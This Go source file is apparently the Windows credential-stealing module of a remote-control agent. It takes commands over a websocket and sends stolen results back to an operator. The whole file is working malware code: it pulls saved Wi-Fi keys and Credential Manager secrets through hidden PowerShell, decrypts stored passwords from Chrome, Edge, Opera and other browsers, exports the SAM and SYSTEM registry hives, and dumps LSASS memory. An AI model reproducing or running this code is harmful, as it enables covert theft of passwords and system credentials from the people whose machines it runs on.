//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
)

// ═══ 凭证窃取模块（Windows） ═══

type credEntry struct {
	Source   string `json:"source"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func handleCredDump(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var req struct {
		Method string `json:"method"`
	}
	json.Unmarshal(msg.Payload, &req)
	if req.Method == "" {
		req.Method = "all"
	}

	var creds []credEntry
	var samInfo, lsassInfo string

	if req.Method == "all" || req.Method == "wifi" {
		creds = append(creds, dumpWiFi()...)
	}
	if req.Method == "all" || req.Method == "credman" {
		creds = append(creds, dumpCredMan()...)
	}
	if req.Method == "all" || req.Method == "browser" {
		creds = append(creds, dumpBrowserCreds()...)
	}
	if req.Method == "all" || req.Method == "sam" {
		samInfo = dumpSAM()
	}
	if req.Method == "lsass" {
		lsassInfo = dumpLSASS()
	}

	if creds == nil {
		creds = []credEntry{}
	}

	result := map[string]interface{}{
		"credentials": creds,
		"sam":         samInfo,
		"lsass":       lsassInfo,
	}

	data, _ := json.Marshal(result)
	resp, _ := json.Marshal(AgentMessage{
		Type:    c2e("cred_dump_result"),
		ID:      msg.ID,
		Payload: data,
	})
	writeMu.Lock()
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	conn.WriteMessage(websocket.TextMessage, resp)
	conn.SetWriteDeadline(time.Time{})
	writeMu.Unlock()
}

// ── WiFi 密码提取（netsh） ──
func dumpWiFi() []credEntry {
	var results []credEntry

	cmd := exec.Command("cmd.exe", "/c", "chcp 65001 >nul & netsh wlan show profiles")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := cmd.Output()
	if err != nil {
		return results
	}

	var profiles []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		// 中文: "所有用户配置文件 : xxx"  英文: "All User Profile     : xxx"
		if idx := strings.Index(line, ": "); idx != -1 &&
			(strings.Contains(line, "Profile") || strings.Contains(line, "配置文件")) {
			name := strings.TrimSpace(line[idx+2:])
			if name != "" {
				profiles = append(profiles, name)
			}
		}
	}

	for _, profile := range profiles {
		cmd := exec.Command("cmd.exe", "/c", "chcp 65001 >nul & netsh wlan show profile name=\""+profile+"\" key=clear")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
		out, err := cmd.Output()
		if err != nil {
			continue
		}

		password := ""
		for _, line := range strings.Split(string(out), "\n") {
			line = strings.TrimSpace(line)
			// 中文: "关键内容            : xxx"  英文: "Key Content            : xxx"
			if idx := strings.Index(line, ": "); idx != -1 &&
				(strings.Contains(line, "Key Content") || strings.Contains(line, "关键内容")) {
				password = strings.TrimSpace(line[idx+2:])
				break
			}
		}

		results = append(results, credEntry{
			Source:   "wifi",
			Target:   profile,
			Username: profile,
			Password: password,
		})
	}

	return results
}

// ── Windows Credential Manager 枚举（PowerShell + .NET P/Invoke） ──
func dumpCredMan() []credEntry {
	var results []credEntry

	// 使用 PowerShell 内联 C# 代码调用 CredEnumerateW
	ps := `
Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
public class CD {
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CredEnumerateW(string f, int fl, out int c, out IntPtr p);
    [DllImport("advapi32.dll")]
    static extern void CredFree(IntPtr b);
    public static string Run() {
        int c; IntPtr p;
        if (!CredEnumerateW(null, 0, out c, out p)) return "";
        int ps = IntPtr.Size;
        var sb = new StringBuilder();
        for (int i = 0; i < c; i++) {
            try {
                IntPtr e = Marshal.ReadIntPtr(p, i * ps);
                string t = Marshal.PtrToStringUni(Marshal.ReadIntPtr(e, 8));
                int bs = Marshal.ReadInt32(e, 8 + ps*2 + 8);
                IntPtr bp = Marshal.ReadIntPtr(e, 8 + ps*2 + 8 + 4 + (ps==8?4:0));
                string u = Marshal.PtrToStringUni(Marshal.ReadIntPtr(e, 8 + ps*2 + 8 + 4 + (ps==8?4:0) + ps + 4 + (ps==8?4:0) + 4 + (ps==8?4:0) + ps*2));
                string pw = "";
                if (bs > 0 && bp != IntPtr.Zero) {
                    byte[] bl = new byte[bs]; Marshal.Copy(bp, bl, 0, bs);
                    try { pw = Encoding.Unicode.GetString(bl); } catch { pw = Convert.ToBase64String(bl); }
                }
                if (sb.Length > 0) sb.Append("\n");
                sb.AppendFormat("{0}\t{1}\t{2}", t ?? "", u ?? "", pw);
            } catch {}
        }
        CredFree(p);
        return sb.ToString();
    }
}
'@
[CD]::Run()
`
	cmd := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-NoProfile", "-c", ps)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := cmd.Output()
	if err != nil {
		return results
	}

	for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "\t", 3)
		if len(parts) < 3 {
			continue
		}
		results = append(results, credEntry{
			Source:   "credman",
			Target:   parts[0],
			Username: parts[1],
			Password: parts[2],
		})
	}

	return results
}

// ── 浏览器凭证提取（纯 Go：DPAPI syscall + SQLite B-tree + AES-GCM） ──

var (
	crypt32                = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
)

type dataBlob struct {
	cbData uint32
	pbData uintptr
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	var inBlob, outBlob dataBlob
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = uintptr(unsafe.Pointer(&data[0]))

	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		return nil, err
	}
	if outBlob.cbData == 0 || outBlob.pbData == 0 {
		return nil, fmt.Errorf("empty output")
	}
	result := make([]byte, outBlob.cbData)
	for i := uint32(0); i < outBlob.cbData; i++ {
		result[i] = *(*byte)(unsafe.Pointer(outBlob.pbData + uintptr(i)))
	}
	syscall.LocalFree(syscall.Handle(outBlob.pbData))
	return result, nil
}

func aesGcmDecrypt(key, nonce, ciphertextWithTag []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCMWithNonceSize(block, len(nonce))
	if err != nil {
		return "", err
	}
	plaintext, err := gcm.Open(nil, nonce, ciphertextWithTag, nil)
	if err != nil {
		return "", err
	}
	return string(plaintext), nil
}

func extractJsonStr(json, key string) string {
	needle := `"` + key + `"`
	idx := strings.Index(json, needle)
	if idx < 0 {
		return ""
	}
	colon := strings.IndexByte(json[idx+len(needle):], ':')
	if colon < 0 {
		return ""
	}
	rest := json[idx+len(needle)+colon+1:]
	start := strings.IndexByte(rest, '"')
	if start < 0 {
		return ""
	}
	rest = rest[start+1:]
	var sb strings.Builder
	for i := 0; i < len(rest); i++ {
		if rest[i] == '\\' && i+1 < len(rest) {
			i++
			sb.WriteByte(rest[i])
			continue
		}
		if rest[i] == '"' {
			break
		}
		sb.WriteByte(rest[i])
	}
	return sb.String()
}

func sqliteVarint(data []byte, pos int) (val int64, n int) {
	for i := 0; i < 9 && pos+i < len(data); i++ {
		val = (val << 7) | int64(data[pos+i]&0x7F)
		if data[pos+i]&0x80 == 0 {
			return val, i + 1
		}
	}
	return val, 9
}

func sqliteColSize(st int64) int {
	switch {
	case st == 0 || st == 8 || st == 9:
		return 0
	case st == 1:
		return 1
	case st == 2:
		return 2
	case st == 3:
		return 3
	case st == 4:
		return 4
	case st == 5:
		return 6
	case st == 6 || st == 7:
		return 8
	case st >= 12 && st%2 == 0:
		return int(st-12) / 2
	case st >= 13 && st%2 == 1:
		return int(st-13) / 2
	}
	return 0
}

func copyLockedFile(src, dst string) error {
	f, err := os.OpenFile(src, os.O_RDONLY, 0)
	if err != nil {
		// 尝试 FileShare 方式
		const FILE_SHARE_RW_DELETE = 0x7
		namep, _ := syscall.UTF16PtrFromString(src)
		h, err2 := syscall.CreateFile(namep, syscall.GENERIC_READ, FILE_SHARE_RW_DELETE, nil, syscall.OPEN_EXISTING, 0, 0)
		if err2 != nil {
			return fmt.Errorf("open: %v / %v", err, err2)
		}
		f = os.NewFile(uintptr(h), src)
	}
	defer f.Close()
	w, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer w.Close()
	_, err = io.Copy(w, f)
	return err
}

func parseLoginDataSqlite(dbPath string, masterKey []byte, browser string) []credEntry {
	var results []credEntry
	data, err := os.ReadFile(dbPath)
	if err != nil || len(data) < 100 {
		return results
	}
	if string(data[:15]) != "SQLite format 3" {
		return results
	}

	pageSize := int(binary.BigEndian.Uint16(data[16:18]))
	if pageSize == 1 {
		pageSize = 65536
	}
	if pageSize < 512 {
		return results
	}

	totalPages := len(data) / pageSize
	for pageNum := 0; pageNum < totalPages; pageNum++ {
		pageOff := pageNum * pageSize
		hdrOff := pageOff
		if pageNum == 0 {
			hdrOff += 100
		}
		if hdrOff >= len(data) {
			continue
		}
		if data[hdrOff] != 0x0D { // leaf table page
			continue
		}

		cellCount := int(binary.BigEndian.Uint16(data[hdrOff+3 : hdrOff+5]))
		ptrStart := hdrOff + 8

		for c := 0; c < cellCount && c < 500; c++ {
			ptrOff := ptrStart + c*2
			if ptrOff+2 > len(data) {
				break
			}
			cellOff := pageOff + int(binary.BigEndian.Uint16(data[ptrOff:ptrOff+2]))
			if cellOff >= len(data) {
				continue
			}

			func() {
				defer func() { recover() }()

				p := cellOff
				_, n := sqliteVarint(data, p)
				p += n // payload length
				_, n = sqliteVarint(data, p)
				p += n // rowid

				recHdrSize, hb := sqliteVarint(data, p)
				recHdrEnd := p + int(recHdrSize)
				hp := p + hb

				var colTypes []int64
				for hp < recHdrEnd && hp < len(data) {
					st, n := sqliteVarint(data, hp)
					hp += n
					colTypes = append(colTypes, st)
				}
				if len(colTypes) < 6 {
					return
				}

				dp := recHdrEnd
				var originUrl, username string
				var pwdBlob []byte

				for col := 0; col < len(colTypes) && dp < len(data); col++ {
					st := colTypes[col]
					colLen := sqliteColSize(st)
					if dp+colLen > len(data) {
						break
					}

					if col == 0 && st >= 13 && st%2 == 1 {
						tl := int(st-13) / 2
						if tl > 0 && dp+tl <= len(data) {
							originUrl = string(data[dp : dp+tl])
						}
					} else if col == 3 && st >= 13 && st%2 == 1 {
						tl := int(st-13) / 2
						if tl > 0 && dp+tl <= len(data) {
							username = string(data[dp : dp+tl])
						}
					} else if col == 5 && st >= 12 && st%2 == 0 {
						bl := int(st-12) / 2
						if bl > 0 && dp+bl <= len(data) {
							pwdBlob = make([]byte, bl)
							copy(pwdBlob, data[dp:dp+bl])
						}
					}
					dp += colLen
				}

				if !strings.HasPrefix(originUrl, "http") || len(pwdBlob) < 16 {
					return
				}

				var password string
				// v10/v11 AES-GCM
				if len(pwdBlob) > 15 && pwdBlob[0] == 'v' && pwdBlob[1] == '1' && (pwdBlob[2] == '0' || pwdBlob[2] == '1') {
					nonce := pwdBlob[3:15]
					ct := pwdBlob[15:]
					pwd, err := aesGcmDecrypt(masterKey, nonce, ct)
					if err == nil && len(pwd) < 200 {
						password = pwd
					}
				} else {
					// DPAPI 旧格式
					dec, err := dpapiDecrypt(pwdBlob)
					if err == nil && len(dec) > 0 {
						password = string(dec)
					}
				}

				if password != "" {
					results = append(results, credEntry{
						Source:   browser,
						Target:   originUrl,
						Username: username,
						Password: password,
					})
				}
			}()
		}
	}
	return results
}

func dumpBrowserCreds() []credEntry {
	var results []credEntry

	localApp := os.Getenv("LOCALAPPDATA")
	roamApp := os.Getenv("APPDATA")

	type browserDef struct{ name, base string }
	browsers := []browserDef{
		{"chrome", filepath.Join(localApp, "Google", "Chrome", "User Data")},
		{"edge", filepath.Join(localApp, "Microsoft", "Edge", "User Data")},
		{"brave", filepath.Join(localApp, "BraveSoftware", "Brave-Browser", "User Data")},
		{"opera", filepath.Join(roamApp, "Opera Software", "Opera Stable")},
		{"operagx", filepath.Join(roamApp, "Opera Software", "Opera GX Stable")},
		{"vivaldi", filepath.Join(localApp, "Vivaldi", "User Data")},
		{"360se", filepath.Join(localApp, "360Chrome", "Chrome", "User Data")},
		{"360ee", filepath.Join(localApp, "360ChromeX", "Chrome", "User Data")},
		{"qq", filepath.Join(localApp, "Tencent", "QQBrowser", "User Data")},
		{"yandex", filepath.Join(localApp, "Yandex", "YandexBrowser", "User Data")},
	}

	for _, br := range browsers {
		if _, err := os.Stat(br.base); err != nil {
			continue
		}

		// 读取 Local State 获取加密密钥
		lsPath := filepath.Join(br.base, "Local State")
		if _, err := os.Stat(lsPath); err != nil {
			parent := filepath.Dir(br.base)
			alt := filepath.Join(parent, "Local State")
			if _, err2 := os.Stat(alt); err2 != nil {
				continue
			}
			lsPath = alt
		}

		lsData, err := os.ReadFile(lsPath)
		if err != nil {
			continue
		}

		encKeyB64 := extractJsonStr(string(lsData), "encrypted_key")
		if encKeyB64 == "" {
			continue
		}

		encKeyRaw, err := base64.StdEncoding.DecodeString(encKeyB64)
		if err != nil || len(encKeyRaw) <= 5 {
			continue
		}

		// 去掉 "DPAPI" 前缀
		dpapiBlob := encKeyRaw[5:]
		masterKey, err := dpapiDecrypt(dpapiBlob)
		if err != nil || len(masterKey) == 0 {
			continue
		}

		// 枚举 Profile 目录
		var profileDirs []string
		entries, _ := os.ReadDir(br.base)
		for _, e := range entries {
			if e.IsDir() && (e.Name() == "Default" || strings.HasPrefix(e.Name(), "Profile ")) {
				profileDirs = append(profileDirs, filepath.Join(br.base, e.Name()))
			}
		}
		if len(profileDirs) == 0 {
			// Opera 等直接在 basePath
			if _, err := os.Stat(filepath.Join(br.base, "Login Data")); err == nil {
				profileDirs = append(profileDirs, br.base)
			} else {
				profileDirs = append(profileDirs, filepath.Join(br.base, "Default"))
			}
		}

		for _, profDir := range profileDirs {
			ldPath := filepath.Join(profDir, "Login Data")
			if _, err := os.Stat(ldPath); err != nil {
				continue
			}

			tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("ld_%d.db", time.Now().UnixNano()))
			if err := copyLockedFile(ldPath, tmpPath); err != nil {
				continue
			}

			creds := parseLoginDataSqlite(tmpPath, masterKey, br.name)
			results = append(results, creds...)
			os.Remove(tmpPath)
		}
	}

	return results
}

// ── SAM 注册表导出 ──
func dumpSAM() string {
	tmpDir := os.TempDir()
	samPath := filepath.Join(tmpDir, ".s"+fmt.Sprintf("%d", os.Getpid()))
	sysPath := filepath.Join(tmpDir, ".y"+fmt.Sprintf("%d", os.Getpid()))
	defer os.Remove(samPath)
	defer os.Remove(sysPath)

	// 启用 SeBackupPrivilege
	privPS := `
$d=@'
using System;using System.Runtime.InteropServices;
public class P{
[DllImport("advapi32.dll",SetLastError=true)]public static extern bool OpenProcessToken(IntPtr h,int a,out IntPtr t);
[DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Unicode)]public static extern bool LookupPrivilegeValueW(string s,string n,out long l);
[DllImport("advapi32.dll",SetLastError=true)]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,IntPtr n,int b,IntPtr p,IntPtr r);
[DllImport("kernel32.dll")]public static extern bool CloseHandle(IntPtr h);
public static void Enable(string priv){
IntPtr t;OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,0x28,out t);
long l;LookupPrivilegeValueW(null,priv,out l);
byte[] tp=new byte[16];BitConverter.GetBytes(1).CopyTo(tp,0);BitConverter.GetBytes(l).CopyTo(tp,4);BitConverter.GetBytes(2).CopyTo(tp,12);
IntPtr p=Marshal.AllocHGlobal(16);Marshal.Copy(tp,0,p,16);AdjustTokenPrivileges(t,false,p,0,IntPtr.Zero,IntPtr.Zero);
Marshal.FreeHGlobal(p);CloseHandle(t);
}}
'@
Add-Type -TypeDefinition $d
[P]::Enable('SeBackupPrivilege')
`
	cmd := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-NoProfile", "-c", privPS)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	cmd.Run()

	// reg save
	cmd1 := exec.Command("reg", "save", `HKLM\SAM`, samPath, "/y")
	cmd1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd1.Run(); err != nil {
		return "SAM export failed: " + err.Error()
	}

	cmd2 := exec.Command("reg", "save", `HKLM\SYSTEM`, sysPath, "/y")
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd2.Run(); err != nil {
		return "SYSTEM export failed: " + err.Error()
	}

	samData, err := os.ReadFile(samPath)
	if err != nil {
		return "SAM read failed: " + err.Error()
	}
	sysData, err := os.ReadFile(sysPath)
	if err != nil {
		return "SYSTEM read failed: " + err.Error()
	}

	return fmt.Sprintf("SAM(%d bytes)+SYSTEM(%d bytes) exported OK", len(samData), len(sysData))
}

// ── LSASS 进程内存转储 ──
func dumpLSASS() string {
	tmpPath := filepath.Join(os.TempDir(), ".l"+fmt.Sprintf("%d", os.Getpid()))
	defer os.Remove(tmpPath)

	// 使用 comsvcs.dll MiniDump
	ps := fmt.Sprintf(`
$p = Get-Process lsass -EA SilentlyContinue | Select -First 1
if (!$p) { Write-Output "lsass not found"; exit 1 }
$id = $p.Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $id %s full
`, tmpPath)

	cmd := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-NoProfile", "-c", ps)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, _ := cmd.CombinedOutput()

	if _, err := os.Stat(tmpPath); err != nil {
		return "LSASS dump failed: " + string(out)
	}

	info, _ := os.Stat(tmpPath)
	return fmt.Sprintf("LSASS dump OK (%d bytes)", info.Size())
}
